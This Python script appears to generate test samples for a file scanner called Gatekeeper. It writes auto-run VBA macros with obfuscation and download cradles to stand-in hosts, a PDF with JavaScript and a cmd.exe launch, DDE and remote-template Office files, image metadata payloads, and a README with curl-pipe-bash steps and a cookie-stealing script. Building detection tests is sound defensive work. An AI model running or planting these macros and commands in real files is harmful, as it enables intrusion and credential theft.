"""
generate_all_samples.py
========================
Generates ALL Gatekeeper test sample files in one run.

BEFORE RUNNING:
  1. Install pywin32 (required for .xlsm, .docm, .doc, .xls):
        py -3.12 -m pip install pywin32

  2. Enable VBA project access in Excel AND Word:
        Excel/Word -> File -> Options -> Trust Center -> Trust Center Settings
        -> Macro Settings -> check "Trust access to the VBA project object model"

  3. Run from your project root:
        py -3.12 generate_all_samples.py

OUTPUT (sample_files/):
  chr_obfuscated_macro.xlsm    Excel macro — Chr() obfuscation (Layer 2 test)
  download_cradle_macro.xlsm   Excel macro — HTTP download cradle (Layer 5 test)
  suspicious_word_macro.docm   Word macro  — Document_Open + WScript.Shell
  suspicious_legacy.doc        Word legacy — AutoOpen + Shell (COM required)
  suspicious_legacy.xls        Excel legacy — Auto_Open + cmd.exe (COM required)
  suspicious_document.pdf      PDF         — JavaScript + OpenAction + Launch
  suspicious_document.docx     Word OOXML  — DDE + remote template injection
  suspicious_document.xlsx     Excel OOXML — DDE + external link
  suspicious_image.png         PNG         — EXIF script injection
  suspicious_image.jpg         JPEG        — EXIF script injection
  suspicious_readme.md         Markdown    — malicious links + script injection
"""

import os
import sys

os.makedirs("sample_files", exist_ok=True)

SEPARATOR = "=" * 60
passed = []
failed = []


def log_result(name, success, reason=""):
    """Records pass/fail for final summary."""
    if success:
        passed.append(name)
    else:
        failed.append(f"{name} — {reason}")


# ===========================================================================
# COM AUTOMATION HELPERS (Excel + Word)
# ===========================================================================

def get_excel():
    """Returns an invisible Excel COM instance."""
    try:
        import win32com.client as win32
        excel = win32.gencache.EnsureDispatch("Excel.Application")
        excel.Visible = False
        excel.DisplayAlerts = False
        return excel
    except ImportError:
        return None


def get_word():
    """Returns an invisible Word COM instance."""
    try:
        import win32com.client as win32
        word = win32.gencache.EnsureDispatch("Word.Application")
        word.Visible = False
        word.DisplayAlerts = False
        return word
    except ImportError:
        return None


def embed_vba_excel(excel, wb, vba_code: str, module_name: str = "Module1"):
    """Embeds VBA code into an Excel workbook via COM."""
    try:
        mod = wb.VBProject.VBComponents.Add(1)
        mod.Name = module_name
        mod.CodeModule.AddFromString(vba_code)
    except Exception as e:
        msg = str(e)
        if "programmatic access" in msg.lower() or "-2147221230" in msg:
            raise RuntimeError(
                "Excel blocked VBA access. Enable: Excel -> File -> Options -> "
                "Trust Center -> Trust Center Settings -> Macro Settings -> "
                "'Trust access to the VBA project object model'"
            )
        raise


def embed_vba_word(word, doc, vba_code: str, module_name: str = "Module1"):
    """Embeds VBA code into a Word document via COM."""
    try:
        mod = doc.VBProject.VBComponents.Add(1)
        mod.Name = module_name
        mod.CodeModule.AddFromString(vba_code)
    except Exception as e:
        msg = str(e)
        if "programmatic access" in msg.lower() or "-2147221230" in msg:
            raise RuntimeError(
                "Word blocked VBA access. Enable: Word -> File -> Options -> "
                "Trust Center -> Trust Center Settings -> Macro Settings -> "
                "'Trust access to the VBA project object model'"
            )
        raise


# ===========================================================================
# 1. XLSM — Chr() obfuscation (Layer 2 test)
# ===========================================================================

VBA_CHR_OBFUSCATED = r"""
Private Sub Auto_Open()
    ' Simulated malware: Chr() encoding hides keywords from static scanners.
    ' Gatekeeper Layer 2 decodes Chr() sequences before rule matching.

    ' Chr(83,104,101,108,108) = "Shell"
    Dim sFunc As String
    sFunc = Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)

    ' Chr(99,109,100,46,101,120,101) = "cmd.exe"
    Dim sExe As String
    sExe = Chr(99) & Chr(109) & Chr(100) & Chr(46) & Chr(101) & Chr(120) & Chr(101)

    ' Execute: Shell "cmd.exe /c whoami"
    Dim sArg As String
    sArg = Chr(32) & Chr(47) & Chr(99) & Chr(32) & Chr(119) & Chr(104) _
         & Chr(111) & Chr(97) & Chr(109) & Chr(105)
    Shell sExe & sArg, vbNormalFocus
End Sub
"""


def create_chr_obfuscated_xlsm(excel):
    path = os.path.abspath("sample_files/chr_obfuscated_macro.xlsm")
    print(f"[*] {path}")
    wb = None
    try:
        wb = excel.Workbooks.Add()
        wb.Sheets(1).Name = "ChrObfTest"
        embed_vba_excel(excel, wb, VBA_CHR_OBFUSCATED)
        wb.SaveAs(path, FileFormat=52)
        print(f"[+] Saved")
        log_result("chr_obfuscated_macro.xlsm", True)
    except Exception as e:
        print(f"[!] Failed: {e}")
        log_result("chr_obfuscated_macro.xlsm", False, str(e))
    finally:
        if wb:
            try: wb.Close(False)
            except: pass


# ===========================================================================
# 2. XLSM — Download cradle (Layer 5 YARA test)
# ===========================================================================

VBA_DOWNLOAD_CRADLE = r"""
Private Sub Workbook_Open()
    ' Simulated malware: HTTP download cradle pattern.
    ' Tests YARA rules: vba_download_cradles + vba_shell_execution.

    Dim oHTTP  As Object
    Dim oShell As Object
    Dim sURL   As String

    sURL = "http://fake-malware-test.example.com/payload.ps1"
    Set oHTTP = CreateObject("MSXML2.XMLHTTP")
    oHTTP.Open "GET", sURL, False
    oHTTP.Send

    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "powershell -ExecutionPolicy bypass -nop -w hidden -enc " _
             & oHTTP.ResponseText, 0, False

    Dim sStaging As String
    sStaging = Environ("APPDATA") & "\update.exe"
End Sub
"""


def create_download_cradle_xlsm(excel):
    path = os.path.abspath("sample_files/download_cradle_macro.xlsm")
    print(f"[*] {path}")
    wb = None
    try:
        wb = excel.Workbooks.Add()
        wb.Sheets(1).Name = "CradleTest"
        embed_vba_excel(excel, wb, VBA_DOWNLOAD_CRADLE)
        wb.SaveAs(path, FileFormat=52)
        print(f"[+] Saved")
        log_result("download_cradle_macro.xlsm", True)
    except Exception as e:
        print(f"[!] Failed: {e}")
        log_result("download_cradle_macro.xlsm", False, str(e))
    finally:
        if wb:
            try: wb.Close(False)
            except: pass


# ===========================================================================
# 3. XLS — Legacy Excel binary (Auto_Open + Shell + cmd.exe)
# ===========================================================================

VBA_LEGACY_XLS = r"""
Private Sub Auto_Open()
    ' Simulated legacy .xls macro malware.
    ' Tests macro scanner against old binary Excel format.

    Dim oShell As Object
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "cmd.exe /c powershell -nop -w hidden -enc JABjAD0A", 0, False

    Dim sPath As String
    sPath = Environ("TEMP") & "\payload.exe"
    Shell "cmd.exe /c certutil -decode payload.b64 " & sPath, vbNormalFocus
End Sub
"""


def create_legacy_xls(excel):
    path = os.path.abspath("sample_files/suspicious_legacy.xls")
    print(f"[*] {path}")
    wb = None
    try:
        wb = excel.Workbooks.Add()
        wb.Sheets(1).Name = "LegacyTest"
        embed_vba_excel(excel, wb, VBA_LEGACY_XLS)
        # FileFormat 56 = xlExcel8 (.xls)
        wb.SaveAs(path, FileFormat=56)
        print(f"[+] Saved")
        log_result("suspicious_legacy.xls", True)
    except Exception as e:
        print(f"[!] Failed: {e}")
        log_result("suspicious_legacy.xls", False, str(e))
    finally:
        if wb:
            try: wb.Close(False)
            except: pass


# ===========================================================================
# 4. DOCM — Word macro (Document_Open + WScript.Shell + powershell)
# ===========================================================================

VBA_WORD_DROPPER = r"""
Private Sub Document_Open()
    ' Simulated Word macro malware.
    ' Tests: Document_Open AutoExec, WScript.Shell, powershell, Environ.

    Dim sAppData As String
    sAppData = Environ("APPDATA")

    Dim oShell As Object
    Set oShell = CreateObject("WScript.Shell")

    Dim sCmd As String
    sCmd = "powershell -ExecutionPolicy bypass -nop -w hidden -c "
    sCmd = sCmd & "Write-Output 'Gatekeeper Test — Not Real Malware'"

    oShell.Run "cmd.exe /c " & sCmd, 0, False
    Set oShell = Nothing
End Sub
"""


def create_word_docm(word):
    path = os.path.abspath("sample_files/suspicious_word_macro.docm")
    print(f"[*] {path}")
    doc = None
    try:
        doc = word.Documents.Add()
        embed_vba_word(word, doc, VBA_WORD_DROPPER)
        # FileFormat 13 = wdFormatXMLDocumentMacroEnabled (.docm)
        doc.SaveAs(path, FileFormat=13)
        print(f"[+] Saved")
        log_result("suspicious_word_macro.docm", True)
    except Exception as e:
        print(f"[!] Failed: {e}")
        log_result("suspicious_word_macro.docm", False, str(e))
    finally:
        if doc:
            try: doc.Close(False)
            except: pass


# ===========================================================================
# 5. DOC — Legacy Word binary (AutoOpen + Shell)
# ===========================================================================

VBA_LEGACY_DOC = r"""
Private Sub AutoOpen()
    ' Simulated legacy .doc macro malware.
    ' Tests macro scanner against old binary Word format.

    Dim oShell As Object
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "powershell -nop -w hidden Invoke-Expression " & _
               "(New-Object Net.WebClient).DownloadString('http://evil.ru/p.ps1')", 0
    oShell.Run "cmd.exe /c certutil -decode drop.b64 drop.exe && drop.exe", 0
    Set oShell = Nothing
End Sub
"""


def create_legacy_doc(word):
    path = os.path.abspath("sample_files/suspicious_legacy.doc")
    print(f"[*] {path}")
    doc = None
    try:
        doc = word.Documents.Add()
        embed_vba_word(word, doc, VBA_LEGACY_DOC)
        # FileFormat 0 = wdFormatDocument97 (.doc)
        doc.SaveAs(path, FileFormat=0)
        print(f"[+] Saved")
        log_result("suspicious_legacy.doc", True)
    except Exception as e:
        print(f"[!] Failed: {e}")
        log_result("suspicious_legacy.doc", False, str(e))
    finally:
        if doc:
            try: doc.Close(False)
            except: pass


# ===========================================================================
# 6. PDF — JavaScript + OpenAction + Launch action + suspicious URL
# ===========================================================================

def create_suspicious_pdf():
    path = "sample_files/suspicious_document.pdf"
    print(f"[*] {os.path.abspath(path)}")
    try:
        pdf_content = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /OpenAction 2 0 R /AcroForm << /Fields [] >> >>
endobj
2 0 obj
<< /Type /Action /S /JavaScript
   /JS (app.alert('Test'); eval(unescape('%61%70%70%2e%61%6c%65%72%74'));
        String.fromCharCode(71,97,116,101,107,101,101,112,101,114))
>>
endobj
3 0 obj
<< /Type /Action /S /Launch /F (cmd.exe)
   /Win << /F (cmd.exe) /P (/c powershell -nop -w hidden) >>
>>
endobj
4 0 obj << /Type /Pages /Kids [5 0 R] /Count 1 >> endobj
5 0 obj
<< /Type /Page /Parent 4 0 R /MediaBox [0 0 612 792]
   /Contents 6 0 R /Annots [7 0 R] /AA << /O 3 0 R >>
>>
endobj
6 0 obj << /Length 44 >>
stream
BT /F1 12 Tf 100 700 Td (Gatekeeper Test PDF) Tj ET
endstream
endobj
7 0 obj
<< /Type /Annot /Subtype /Link /Rect [100 600 300 620]
   /A << /Type /Action /S /URI /URI (http://malware-test.xyz/payload.exe) >>
>>
endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000068 00000 n
0000000230 00000 n
0000000370 00000 n
0000000430 00000 n
0000000600 00000 n
0000000696 00000 n
trailer << /Size 8 /Root 1 0 R >>
startxref
840
%%EOF"""
        with open(path, "wb") as f:
            f.write(pdf_content)
        print(f"[+] Saved")
        log_result("suspicious_document.pdf", True)
    except Exception as e:
        print(f"[!] Failed: {e}")
        log_result("suspicious_document.pdf", False, str(e))


# ===========================================================================
# 7. DOCX — DDE + remote template injection
# ===========================================================================

def create_suspicious_docx():
    path = "sample_files/suspicious_document.docx"
    print(f"[*] {os.path.abspath(path)}")
    try:
        import zipfile
        ct = b"""<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml"  ContentType="application/xml"/>
  <Override PartName="/word/document.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>"""
        rels = b"""<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="word/document.xml"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="http://malware-test.xyz/remote_template.dotm" TargetMode="External"/>
</Relationships>"""
        doc_xml = b"""<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>Invoice #2026-0892</w:t></w:r></w:p>
    <w:p><w:r><w:t>DDEAUTO cmd.exe "/c powershell -nop -w hidden"</w:t></w:r></w:p>
    <w:p><w:r><w:t>Contact: billing@secure-bank.ru for queries</w:t></w:r></w:p>
  </w:body>
</w:document>"""
        word_rels = b"""<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="http://malware-test.xyz/remote_template.dotm" TargetMode="External"/>
</Relationships>"""
        with zipfile.ZipFile(path, "w") as zf:
            zf.writestr("[Content_Types].xml",          ct)
            zf.writestr("_rels/.rels",                  rels)
            zf.writestr("word/document.xml",            doc_xml)
            zf.writestr("word/_rels/document.xml.rels", word_rels)
        print(f"[+] Saved")
        log_result("suspicious_document.docx", True)
    except Exception as e:
        print(f"[!] Failed: {e}")
        log_result("suspicious_document.docx", False, str(e))


# ===========================================================================
# 8. XLSX — DDE + external link + suspicious content
# ===========================================================================

def create_suspicious_xlsx():
    path = "sample_files/suspicious_document.xlsx"
    print(f"[*] {os.path.abspath(path)}")
    try:
        import openpyxl
        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = "Invoice"
        ws["A1"] = "DDEAUTO cmd.exe powershell -ExecutionPolicy bypass"
        ws["A2"] = '=HYPERLINK("http://malware-download.ru/payload.exe","Click to update")'
        ws["A3"] = "Contact: billing@secure-bank.xyz"
        ws["A4"] = "rundll32.exe shell32.dll,ShellExec_RunDLL"
        ws["B1"] = "Invoice Total"
        ws["B2"] = 15432.00
        wb.save(path)
        print(f"[+] Saved")
        log_result("suspicious_document.xlsx", True)
    except Exception as e:
        print(f"[!] Failed: {e}")
        log_result("suspicious_document.xlsx", False, str(e))


# ===========================================================================
# 9. PNG — EXIF metadata injection
# ===========================================================================

def create_suspicious_png():
    path = "sample_files/suspicious_image.png"
    print(f"[*] {os.path.abspath(path)}")
    try:
        from PIL import Image, PngImagePlugin
        img  = Image.new("RGB", (200, 200), color=(70, 130, 180))
        meta = PngImagePlugin.PngInfo()
        meta.add_text("Comment",
            "<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script> "
            "powershell -nop -w hidden -enc JABjAD0ATgBlAHcA")
        meta.add_text("Author",
            "wget http://malware-test.ru/payload.sh && chmod +x payload.sh")
        meta.add_text("Software", "steghide 0.5.1")
        meta.add_text("Description",
            "cmd.exe /c certutil -decode payload.b64 payload.exe")
        img.save(path, "PNG", pnginfo=meta)
        print(f"[+] Saved")
        log_result("suspicious_image.png", True)
    except Exception as e:
        print(f"[!] Failed: {e}")
        log_result("suspicious_image.png", False, str(e))


# ===========================================================================
# 10. JPG — EXIF metadata injection
# ===========================================================================

def create_suspicious_jpg():
    path = "sample_files/suspicious_image.jpg"
    print(f"[*] {os.path.abspath(path)}")
    try:
        from PIL import Image
        import io

        img = Image.new("RGB", (300, 300), color=(200, 100, 50))
        buf = io.BytesIO()
        img.save(buf, "JPEG")
        jpg_bytes = bytearray(buf.getvalue())

        # Inject malicious JPEG comment (0xFFFE marker)
        comment = (
            b"<script>eval(unescape('%70%6f%77%65%72%73%68%65%6c%6c'))</script> "
            b"steghide 0.5.1 wget http://malware-payload.ru/evil.sh "
            b"powershell -nop -w hidden cmd.exe certutil -decode"
        )
        comment_len   = len(comment) + 2
        comment_block = b"\xff\xfe" + comment_len.to_bytes(2, "big") + comment

        # Insert after SOI marker
        final = bytes(jpg_bytes[:2]) + comment_block + bytes(jpg_bytes[2:])
        with open(path, "wb") as f:
            f.write(final)
        print(f"[+] Saved")
        log_result("suspicious_image.jpg", True)
    except Exception as e:
        print(f"[!] Failed: {e}")
        log_result("suspicious_image.jpg", False, str(e))


# ===========================================================================
# 11. MD — malicious links + script injection + credential exposure
# ===========================================================================

def create_suspicious_md():
    path = "sample_files/suspicious_readme.md"
    print(f"[*] {os.path.abspath(path)}")
    try:
        content = """# Project Setup Guide

## Installation

Run the following to set up your environment:

```bash
wget http://malware-test.ru/setup.sh && bash -c "$(curl -fsSL http://evil-domain.xyz/install)"
chmod +x ./run.sh
powershell -ExecutionPolicy bypass -nop -w hidden -enc JABjAD0ATgBlAHcA
```

## Configuration

```
password = Sup3rS3cr3tP@ssw0rd123
api_key = sk-proj-abc123def456ghi789jkl
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2a2rwplBQLzxmzGG3mMhfake
-----END RSA PRIVATE KEY-----
```

## Support

[Click here for secure login](http://phishing-site.ru/steal-credentials)

[https://legitimate-bank.com](http://actual-malware.xyz/fake-page)

<script>document.location='http://evil.tk/steal?c='+document.cookie</script>

Note: act within 24 hours or your account will be deleted.
"""
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"[+] Saved")
        log_result("suspicious_readme.md", True)
    except Exception as e:
        print(f"[!] Failed: {e}")
        log_result("suspicious_readme.md", False, str(e))


# ===========================================================================
# MAIN
# ===========================================================================

def main():
    """
    Generates all Gatekeeper test sample files.

    COM-dependent files (xlsm, xls, docm, doc) are grouped to open
    Excel and Word only once each, minimising COM overhead.
    Pure-Python files (pdf, docx, xlsx, png, jpg, md) run independently.
    """
    print(SEPARATOR)
    print("Gatekeeper — All Format Test Sample Generator")
    print(SEPARATOR)
    print()

    # ---- Excel COM files (xlsm × 2, xls) ----
    print("── Excel (COM) ──────────────────────────────────────────")
    excel = get_excel()
    if excel:
        try:
            create_chr_obfuscated_xlsm(excel)
            print()
            create_download_cradle_xlsm(excel)
            print()
            create_legacy_xls(excel)
        finally:
            try: excel.Quit()
            except: pass
    else:
        print("[!] pywin32 not available — skipping Excel COM files")
        print("    Install with: py -3.12 -m pip install pywin32")
        for name in ["chr_obfuscated_macro.xlsm",
                     "download_cradle_macro.xlsm",
                     "suspicious_legacy.xls"]:
            log_result(name, False, "pywin32 not installed")
    print()

    # ---- Word COM files (docm, doc) ----
    print("── Word (COM) ───────────────────────────────────────────")
    word = get_word()
    if word:
        try:
            create_word_docm(word)
            print()
            create_legacy_doc(word)
        finally:
            try: word.Quit()
            except: pass
    else:
        print("[!] pywin32 not available — skipping Word COM files")
        for name in ["suspicious_word_macro.docm", "suspicious_legacy.doc"]:
            log_result(name, False, "pywin32 not installed")
    print()

    # ---- Pure Python files ----
    print("── Pure Python (no COM required) ────────────────────────")
    create_suspicious_pdf()
    print()
    create_suspicious_docx()
    print()
    create_suspicious_xlsx()
    print()
    create_suspicious_png()
    print()
    create_suspicious_jpg()
    print()
    create_suspicious_md()
    print()

    # ---- Summary ----
    print(SEPARATOR)
    print(f"[+] Generated: {len(passed)} / {len(passed) + len(failed)} files")
    print()
    if passed:
        print("Passed:")
        for name in passed:
            print(f"  ✓ sample_files/{name}")
    if failed:
        print()
        print("Failed:")
        for msg in failed:
            print(f"  ✗ {msg}")
    print()
    print("Scan all files:")
    print()
    for name in passed:
        print(f"  py -3.12 gatekeeper.py sample_files\\{name}")
    print(SEPARATOR)


if __name__ == "__main__":
    main()